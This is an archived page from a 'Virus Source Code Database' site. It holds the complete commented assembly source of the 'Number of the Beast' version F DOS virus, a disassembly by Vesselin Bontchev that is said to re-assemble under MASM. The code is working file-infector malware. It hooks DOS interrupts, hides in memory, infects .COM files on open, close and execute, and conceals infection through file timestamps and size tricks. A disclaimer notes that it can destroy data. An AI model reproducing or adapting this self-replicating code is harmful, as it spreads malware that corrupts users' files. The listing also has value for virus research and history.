<html>
<head><meta http-equiv=Content-Type content='text/html; charset=UTF-8'>

<title>Virus Source Code Database :: nobeastf_asm</title>
<meta name="KEYWORDS" content="nobeastf.asm, virus source, source code, assembly language, assembly programming, hacking, cracking, michaelangelo, stoned, pong, cascade, ambulance, f-prot, mcafee, panda, solomon, anti-virus, anti virus, computer virus">
<meta name="DESCRIPTION" content="Virus Source Code Database - source for nobeastf.asm">
</head><body><table border=0 cellpadding=0 cellspacing=0 width="100%">
<tr><td valign=top width="25%">
<a href="naktruth_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/n/naktruth_asm.php">naktruth_asm</a><br>
<a href="narcosis_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/n/narcosis_asm.php">narcosis_asm</a><br>
<a href="natas_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/n/natas_asm.php">natas_asm</a><br>
<a href="nav_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/n/nav_asm.php">nav_asm</a><br>
<a href="navigatr_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/n/navigatr_asm.php">navigatr_asm</a><br>
<a href="navigtor_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/n/navigtor_asm.php">navigtor_asm</a><br>
<a href="javascript:if(confirm('http://www.totallygeek.com/vscdb/n/naziph2b_pas.php  \n\nThis file was not retrieved by Teleport Pro, because it was unavailable, or its retrieval was aborted, or the project was stopped too soon.  \n\nDo you want to open it from the server?'))window.location='http://www.totallygeek.com/vscdb/n/naziph2b_pas.php'" tppabs="http://www.totallygeek.com/vscdb/n/naziph2b_pas.php">naziph2b_pas</a><br>
<a href="naziph2_pas.php.htm" tppabs="http://www.totallygeek.com/vscdb/n/naziph2_pas.php">naziph2_pas</a><br>
<a href="naziphob_pas.php.htm" tppabs="http://www.totallygeek.com/vscdb/n/naziphob_pas.php">naziphob_pas</a><br>
<a href="nd_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/n/nd_asm.php">nd_asm</a><br>
<a href="necro_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/n/necro_asm.php">necro_asm</a><br>
<a href="ned09__asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/n/ned09__asm.php">ned09__asm</a><br>
<a href="ned09_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/n/ned09_asm.php">ned09_asm</a><br>
<a href="ned_demo_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/n/ned_demo_asm.php">ned_demo_asm</a><br>
<a href="neuro_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/n/neuro_asm.php">neuro_asm</a><br>
<a href="neuroeng_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/n/neuroeng_asm.php">neuroeng_asm</a><br>
<a href="neverend_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/n/neverend_asm.php">neverend_asm</a><br>
<a href="neverone_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/n/neverone_asm.php">neverone_asm</a><br>
<a href="newc_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/n/newc_asm.php">newc_asm</a><br>
<a href="newtroi_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/n/newtroi_asm.php">newtroi_asm</a><br>
<a href="newvir_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/n/newvir_asm.php">newvir_asm</a><br>
<a href="newzland_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/n/newzland_asm.php">newzland_asm</a><br>
<a href="newzlnd2_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/n/newzlnd2_asm.php">newzlnd2_asm</a><br>
<a href="newzlndb_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/n/newzlndb_asm.php">newzlndb_asm</a><br>
<a href="nhackerf_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/n/nhackerf_asm.php">nhackerf_asm</a><br>
<a href="nibbles_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/n/nibbles_asm.php">nibbles_asm</a><br>
<a href="nina___asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/n/nina___asm.php">nina___asm</a><br>
<a href="nina__asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/n/nina__asm.php">nina__asm</a><br>
<a href="nina_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/n/nina_asm.php">nina_asm</a><br>
<a href="nina-d_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/n/nina-d_asm.php">nina-d_asm</a><br>
<a href="ninja_1_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/n/ninja_1_asm.php">ninja_1_asm</a><br>
<a href="ninja-1_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/n/ninja-1_asm.php">ninja-1_asm</a><br>
<a href="ninja1_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/n/ninja1_asm.php">ninja1_asm</a><br>
<a href="nkpox11_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/n/nkpox11_asm.php">nkpox11_asm</a><br>
<a href="no_1_a_pas.php.htm" tppabs="http://www.totallygeek.com/vscdb/n/no_1_a_pas.php">no_1_a_pas</a><br>
<a href="no_1_b_pas.php.htm" tppabs="http://www.totallygeek.com/vscdb/n/no_1_b_pas.php">no_1_b_pas</a><br>
<a href="nobeaste_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/n/nobeaste_asm.php">nobeaste_asm</a><br>
<a href="nobeastf_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/n/nobeastf_asm.php">nobeastf_asm</a><br>
<a href="noint_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/n/noint_asm.php">noint_asm</a><br>
<a href="nomem_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/n/nomem_asm.php">nomem_asm</a><br>
<a href="nomncltr_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/n/nomncltr_asm.php">nomncltr_asm</a><br>
<a href="nont-512_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/n/nont-512_asm.php">nont-512_asm</a><br>
<a href="not_casc_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/n/not_casc_asm.php">not_casc_asm</a><br>
<a href="notimp_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/n/notimp_asm.php">notimp_asm</a><br>
<a href="npox10_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/n/npox10_asm.php">npox10_asm</a><br>
<a href="npox11_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/n/npox11_asm.php">npox11_asm</a><br>
<a href="npox_1_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/n/npox_1_asm.php">npox_1_asm</a><br>
<a href="npox-1_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/n/npox-1_asm.php">npox-1_asm</a><br>
<a href="npox21_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/n/npox21_asm.php">npox21_asm</a><br>
<a href="npox_v10_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/n/npox_v10_asm.php">npox_v10_asm</a><br>
<a href="npox-v10_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/n/npox-v10_asm.php">npox-v10_asm</a><br>
<a href="npox_v11_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/n/npox_v11_asm.php">npox_v11_asm</a><br>
<a href="npox-v11_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/n/npox-v11_asm.php">npox-v11_asm</a><br>
<a href="npox-v20_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/n/npox-v20_asm.php">npox-v20_asm</a><br>
<a href="npox-v21_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/n/npox-v21_asm.php">npox-v21_asm</a><br>
<a href="nrlg_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/n/nrlg_asm.php">nrlg_asm</a><br>
<a href="nrlgsant_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/n/nrlgsant_asm.php">nrlgsant_asm</a><br>
<a href="nukex_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/n/nukex_asm.php">nukex_asm</a><br>
<a href="number1_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/n/number1_asm.php">number1_asm</a><br>
<a href="number1b_pas.php.htm" tppabs="http://www.totallygeek.com/vscdb/n/number1b_pas.php">number1b_pas</a><br>
<a href="number_1_pas.php.htm" tppabs="http://www.totallygeek.com/vscdb/n/number_1_pas.php">number_1_pas</a><br>
<a href="number1_pas.php.htm" tppabs="http://www.totallygeek.com/vscdb/n/number1_pas.php">number1_pas</a><br>
<a href="number_6_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/n/number_6_asm.php">number_6_asm</a><br>
<a href="number-6_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/n/number-6_asm.php">number-6_asm</a><br>
<a href="number6_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/n/number6_asm.php">number6_asm</a><br>
<a href="nymphmit_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/n/nymphmit_asm.php">nymphmit_asm</a><br>
<a href="nzeland2_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/n/nzeland2_asm.php">nzeland2_asm</a><br>
<a href="nzeland_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/n/nzeland_asm.php">nzeland_asm</a><br>
</td>
<td valign=top><center><h2>Virus Source Code Database</h2>
<script type="text/javascript">
<!--
                  google_ad_client = "pub-4280558320877613";
                  google_ad_width = 468;
                  google_ad_height = 60;
                  google_ad_format = "468x60_as";
                  google_ad_channel = "5524853059";
                  google_ad_type = "text";
                  google_color_border = "A2CCEE";
                  google_color_bg = "EFEFEF";
                  google_color_link = "000000";
                  google_color_url = "006600";
                  google_color_text = "000000";
        //--></script>
<script type="text/javascript" src="show_ads.js" tppabs="http://pagead2.googlesyndication.com/pagead/show_ads.js"></script>
<p>
<i>This source code is provided for computer programming history.  This source code can be used for good or evil.  It can 
destroy computer data.  Be aware that I am making no claims to authorship or usability of the information found in the 
Virus Source Code Database.  I accept no responsibility for data corruption due to the use of the following information.  The 
information contained on this website is for <b>Information Purposes Only</b>!!!</i><p>
<p>
[ <a href="index.php.htm" tppabs="http://www.totallygeek.com/vscdb/1/index.php">1</a> ]&nbsp;
[ <a href="index-1.php.htm" tppabs="http://www.totallygeek.com/vscdb/a/index.php">a</a> ]&nbsp;
[ <a href="index-2.php.htm" tppabs="http://www.totallygeek.com/vscdb/b/index.php">b</a> ]&nbsp;
[ <a href="index-3.php.htm" tppabs="http://www.totallygeek.com/vscdb/c/index.php">c</a> ]&nbsp;
[ <a href="index-4.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/index.php">d</a> ]&nbsp;
[ <a href="index-5.php.htm" tppabs="http://www.totallygeek.com/vscdb/e/index.php">e</a> ]&nbsp;
[ <a href="index-6.php.htm" tppabs="http://www.totallygeek.com/vscdb/f/index.php">f</a> ]&nbsp;
[ <a href="index-7.php.htm" tppabs="http://www.totallygeek.com/vscdb/g/index.php">g</a> ]&nbsp;
[ <a href="index-8.php.htm" tppabs="http://www.totallygeek.com/vscdb/h/index.php">h</a> ]&nbsp;
[ <a href="index-9.php.htm" tppabs="http://www.totallygeek.com/vscdb/i/index.php">i</a> ]&nbsp;
[ <a href="index-10.php.htm" tppabs="http://www.totallygeek.com/vscdb/j/index.php">j</a> ]&nbsp;
[ <a href="index-11.php.htm" tppabs="http://www.totallygeek.com/vscdb/k/index.php">k</a> ]&nbsp;
[ <a href="index-12.php.htm" tppabs="http://www.totallygeek.com/vscdb/l/index.php">l</a> ]&nbsp;
[ <a href="index-13.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/index.php">m</a> ]&nbsp;
[ <a href="index-14.php.htm" tppabs="http://www.totallygeek.com/vscdb/n/index.php">n</a> ]&nbsp;
[ <a href="index-15.php.htm" tppabs="http://www.totallygeek.com/vscdb/o/index.php">o</a> ]&nbsp;
[ <a href="index-16.php.htm" tppabs="http://www.totallygeek.com/vscdb/p/index.php">p</a> ]&nbsp;
[ <a href="index-17.php.htm" tppabs="http://www.totallygeek.com/vscdb/q/index.php">q</a> ]&nbsp;
[ <a href="index-18.php.htm" tppabs="http://www.totallygeek.com/vscdb/r/index.php">r</a> ]&nbsp;
[ <a href="index-19.php.htm" tppabs="http://www.totallygeek.com/vscdb/s/index.php">s</a> ]&nbsp;
[ <a href="index-20.php.htm" tppabs="http://www.totallygeek.com/vscdb/t/index.php">t</a> ]&nbsp;
[ <a href="index-21.php.htm" tppabs="http://www.totallygeek.com/vscdb/u/index.php">u</a> ]&nbsp;
[ <a href="index-22.php.htm" tppabs="http://www.totallygeek.com/vscdb/v/index.php">v</a> ]&nbsp;
[ <a href="index-23.php.htm" tppabs="http://www.totallygeek.com/vscdb/w/index.php">w</a> ]&nbsp;
[ <a href="index-24.php.htm" tppabs="http://www.totallygeek.com/vscdb/x/index.php">x</a> ]&nbsp;
[ <a href="index-25.php.htm" tppabs="http://www.totallygeek.com/vscdb/y/index.php">y</a> ]&nbsp;
[ <a href="index-26.php.htm" tppabs="http://www.totallygeek.com/vscdb/z/index.php">z</a> ]&nbsp;
</center><p><textarea cols=90 rows=30>

	name	V512F
	title	V512F - The 'Number of the Beast' Virus
	subttl	(Version F - a slight mutation of the original one)
	.radix	16

; ษออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออป
; บ  Bulgaria, 1404 Sofia, kv. "Emil Markov", bl. 26, vh. "W", ap. 51        บ
; บ  Telephone: Private: (+35-92) 58-62-61, Office: (+35-92) 71-401 ext. 255 บ
; บ									     บ
; บ		     The 'Number of the Beast' Virus, version F              บ
; บ		   Disassembled by Vesselin Bontchev, April 1990	     บ
; บ									     บ
; บ		     Copyright (c) Vesselin Bontchev 1989, 1990 	     บ
; บ									     บ
; บ	 This listing is only to be made available to virus researchers      บ
; บ		   or software writers on a need-to-know basis. 	     บ
; ศออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออผ

; The disassembly has been tested by re-assembly using MASM 5.0.

code	segment
	assume	cs:code,ds:code,es:code

	org	100

start:
	mov	ah,30		; Get DOS version
	int	21

	mov	si,4		; Point DS at interrupt vectors
	mov	ds,si

	cmp	ah,1E		; Minor version >= 30?
	lds	ax,[si+8]	; Get INT 13h vector in DS:AX
	jb	low_ver 	; That's all if minor DOS version < 30

	mov	ah,13		; Get original INT 13h vector in DS:DX
	int	2F
	push	ds		; Save it
	push	dx
	int	2F		; Call INT 2F again to restore DS & DX
	pop	ax		; Restore original INT 13h
	pop	ds		;  vector in DS:DX

low_ver:
	mov	di,0F8		; Now INT 13h vector is in DS:DX
	stosw			; Save it at PSP:0F8
	mov	ax,ds
	stosw

	mov	ds,si		; Now get INT 21h vector in DS:AX
	lds	ax,[si+40]
	stosw			; And store it at PSP:0FC
	cmp	ax,(new_int_21 - start) + 8	; Virus in memory?
	mov	ax,ds
	stosw			; By the way, now DI == 100h

	push	es		; Now RETF will jump to PSP:100h,
	push	di		;  i.e. to start
	jne	skip1		; Virus not present. Go to installation

	shl	si,1		; Second check for virus in memory. SI := 8
	mov	cx,(endaddr-start)/2	; Compare the virus code with DS:8
	rep	cmpsw		;  (100h words)
skip1:
	push	cs		; Restore DS := CS
	pop	ds
	je	run		; Virus found. Run the original program

; Virus not found in memory. Install it there. The memory check is not
; quite correct. Since the virus does not try to be the fist program
; which intercepts INT 21h, it is possible that it is already present
; in memory, but another program (a TSR one) has changed the INT 21h
; vector. This will cause the reloading of the virus and another buffer
; will "disapear". If there is no more buffers, the machine may hang.

	mov	ah,52		; Get list of lists in ES:BX
	int	21

	push	es		; Save list's segment
	mov	si,0F8		; Prepare for move. Offset of source address.
	sub	di,di		; Offset of destination address (0)
	les	ax,es:[bx+12]	; Point ES:AX at first DOS buffer

; Point DX at next DOS buffer. And what if there is no more buffers?

	mov	dx,es:[di+2]

; Copy the saved original interrupt vectors plus
; the virus body in the 1st DOS buffer:

	mov	cx,(endaddr-start+8)/2
	rep	movsw

	mov	ds,cx		; Install ES:121 (new_int_21)
	mov	di,16		;  as new INT 21h handler
	mov	word ptr [di+21*4-16],(new_int_21 - start) + 8
	mov	[di+21*4-16+2],es

	pop	ds		; Point DS at the list of lists' segment

; "Hide" the virus (now in the first DOS buffer) by excluding this
; buffer from the DOS buffer chain. To do so, just set the
; first buffer pointer to point at the next buffer of the chain.
; (DX already points at the next DOS I/O buffer.)

	mov	[bx+14],dx

	mov	dx,cs		; DX := current PSP
	mov	ds,dx		; Restore DS == CS

	mov	bx,[di+2-16]	; Point BX at high memory
	dec	bh

; The second byte of the instruction above is 0CFh == IRET

new_int_24	equ	$-1

	mov	es,bx		; Point ES at the last 4 Kbytes of memory

; If the current PSP is less than the previous one, then
; IBMDOS.COM is just loading the command interpretter
; and the current PSP belongs to the latter.

	cmp	dx,[di]

; Get command interpretter's full name in DS:16h

	mov	ds,[di]
	mov	dx,[di]
	dec	dx
	mov	ds,dx

	mov	si,cx		; SI := 0
	mov	dx,di		; DX := 16h (DI == 16h)
	mov	cl,28		; Copy name to higher memory (eventualy
	rep	movsw		;  destroys COMMAND.COM's transient part)

	mov	ds,bx
	jb	boot		; Run command interpretter at boot time

	int	20		; Program terminate

run:
	mov	si,cx		; SI := 0
	mov	ds,[si+2C]	; Get environment address
srch_lp:
	lodsw			; Search the end of the environment
	dec	si
	test	ax,ax
	jnz	srch_lp

	add	si,3		; Get program's name (argv [0]) in DX
	mov	dx,si
boot:
	mov	ah,3Dh		; Open file
	call	dos_call

	mov	dx,[di] 	; DX := file size
	mov	[di+4],dx	; Position at the end of file
	add	[di],cx 	; Add 512 bytes to file size

	pop	dx
	push	dx		; DX := 100h (offset start)

	push	cs		; ES := DS := CS
	pop	ds
	push	ds
	pop	es

	push	es
	mov	al,50		; AH is 0 (from dos_call)
	push	ax

; Now RETF will jump to PSP:50h. There are the instructions INT 21h; RETF there.
; Thus, this will execute the next DOS function call, then jump to PSP:100h.

	mov	ah,3F		; Read from file handle
	retf			; (the first 512 bytes into PSP:100h)

dos_call:
	int	21		; Invoke DOS function call
	jc	dos_ret 	; Exit on error
	mov	bx,ax		; Save the file handle in BX
point:
	push	bx		; Save BX
	mov	ax,1220 	; Get system file table entry No. for
	int	2F		;  file the handle in BX into ES:DI

	mov	bl,es:[di]
	mov	ax,1216 	; Get system FCB for file table entry
	int	2F		;  No. in BX into ES:DI
	pop	bx		; Restore BX

	push	es
	pop	ds		; DS := ES

	add	di,11		; Point ES:DI & DS:DI at file size
	mov	cx,512d 	; CX := 512
dos_ret:
	ret			; Done. Exit

read:				; READ function handler
	sti			; Enable interrupts
	call	point		; Point ES:DI at file's internal FCB

	mov	bp,cx		; BP := 512
	mov	si,[di+4]	; Point SI at file position
	pop	cx		; Restore CX & DS
	pop	ds
	call	do_read 	; Read from file handle
	jc	int_21_xit1	; Exit on error

	cmp	si,bp		; Is file position < 512?
	jnb	int_21_xit1	; Exit if not

	push	ax		; Save AX
	mov	al,es:[di-4]	; Get file time
	not	al
	and	al,1F		; Seconds == 62?
	jnz	int_21_xit	; Exit if not

	add	si,es:[di]	; Compute offset at original code
	xchg	si,es:[di+4]	; Swap position (correct)
	add	es:[di],bp	; Correct file size (+512)
	call	do_read 	; Read from file handle
	mov	es:[di+4],si	; Restore original position
	lahf			; Save flags
	sub	es:[di],bp	; Restore original file size (-512)
	sahf			; Restore flags
int_21_xit:
	pop	ax		; Restore AX
int_21_xit1:
	pop	bp		; Restore saved registers
	pop	di
	pop	si
	pop	es
	retf	2		; Return error code in flags

do_read:
	mov	ah,3F		; READ from file using handle
do_dos:
	pushf
	push	cs		; Prepare for IRET
	call	orig_21
	ret

new_int_21:
	push	es		; Save registers used
	push	si
	push	di
	push	bp
	push	ds
	push	cx

	cmp	ah,3F		; Is it a READ function call?
	je	read		; Do it if so

	push	ax		; Save some more registers
	push	bx
	push	dx

	cmp	ah,3E		; Is it a CLOSE function call?
	je	close		; Do it if so
	cmp	ax,4B00 	; Is it an EXEC function call?
	mov	ah,3Dh		; Convert it to OPEN if so
	je	exec		; And execute it
dos_xit:
	pop	dx		; Neither READ, nor CLOSE, nor EXEC.
	pop	bx		; Restore registers and exit
	pop	ax
	pop	cx
	pop	ds
	pop	bp
	pop	di
	pop	si
	pop	es
orig_21:			; Exit trough the original INT 21h handler
	jmp	dword ptr cs:[4]

close:				; CLOSE function handler
	mov	ah,45		; First duplicate the handle
exec:				; EXEC function handler
	call	dos_call
	jc	dos_xit 	; Exit on error

	sub	ax,ax		; AX := 0
	mov	[di+4],ax	; Seek to file beginning
	mov	byte ptr [di-0F],10b	; Set access rights to writable

	cld			; Clear direction flag
	mov	ds,ax
	mov	si,13*4 	; Save INT 13h vector on stack
	lodsw
	push	ax
	lodsw
	push	ax

	push	[si+24*4-(13*4+4)]	; Save INT 24h vector on stack
	push	[si+24*4-(13*4+4)+2]

	lds	dx,cs:[si-(13*4+4)]	; Set INT 13h to saved vector
	mov	ax,2513 	; Set interrupt vector
	int	21

	push	cs
	pop	ds		; DS := CS
	mov	dx,(new_int_24 - start) + 8
	mov	al,24		; Set INT 24h (critical error handler) to IRET
	int	21		; Set interrupt vector

	push	es
	pop	ds		; DS := ES
	mov	al,[di-4]	; Get file time
	and	al,1F		;  (the seconds more exactly)
	cmp	al,1F		; File infected?
	je	skip2		; Skip the following code if so

	mov	ax,[di+17]	; Get file extension
	sub	ax,'OC'         ; '*.CO?' file?
	jne	go_close	; Exit if not
skip2:
	xor	[di-4],al	; Zero file seconds
	mov	ax,[di] 	; Get file size
	cmp	ax,cx		; Is file size < 512?
	jb	go_close	; Don't infect if so
	add	ax,cx
	jc	go_close	; Don't infect if file size + 512 > 64 K

	test	byte ptr [di-0Dh],100b	; Test System attribute
	jnz	go_close	; Exit if ON

	lds	si,[di-0A]	; Get device driver pointer
	cmp	[si+4],ch	; See if at least 3 sectors/cluster (CH == 02h)
	jb	skip3
	dec	ax
	shr	ah,1		; AH := number of last sector after infection
	and	ah,[si+4]	; Get sector's number in the cluster
	jz	go_close	; Exit if does not fit

skip3:
	mov	ax,20
	mov	ds,ax		; Read 512 bytes using file handle
	sub	dx,dx		;  into 0000:0200h
	call	do_read 	; Do it

	mov	si,dx		; SI := 512 (DX == 512)
	push	cx		; Save CX (CX == 512)
v_srch:
	lodsb
	cmp	al,cs:[si+7]	; See if virus present in file
	jne	infect		; Infect file if not
	loop	v_srch
	pop	cx		; Restore CX
exit1:
	or	byte ptr es:[di-4],1F	; Set file time seconds to 62
exit2:
	or	byte ptr es:[di-0Bh],40 ; Set 'file modified' bit
go_close:
	mov	ah,3E		; Close file
	call	do_dos		; Execute the function

	or	byte ptr es:[di-0C],40	; ??? Flag ???

	pop	ds		; Restore INT 24h vector from stack
	pop	dx
	mov	ax,2524
	int	21		; Set interrupt vector

	pop	ds		; Restore INT 13h vector form stack
	pop	dx
	mov	al,13		; AH still equals 25h
	int	21		; Set interrupt vector
	jmp	dos_xit 	; Exit

infect:
	pop	cx
	mov	si,es:[di]	; Get file size
	mov	es:[di+4],si	; Seek at end of file

	mov	ah,40		; Write to file (the original bytes)
	int	21
	jc	exit2		; Exit on error

	mov	es:[di],si	; Restore original file size
	mov	es:[di+4],dx	; Position at file beginning

	push	cs
	pop	ds		; DS := CS

	mov	dl,8		; Write virus code (at DS:8) onto
	mov	ah,40		;  the file beginning
	int	21
	jmp	exit1		; And exit

cpright db	'666'           ; Author's signature (the devil's number)

endaddr equ	$

code	ends
	end	start

</textarea></td></tr></table></body></html>
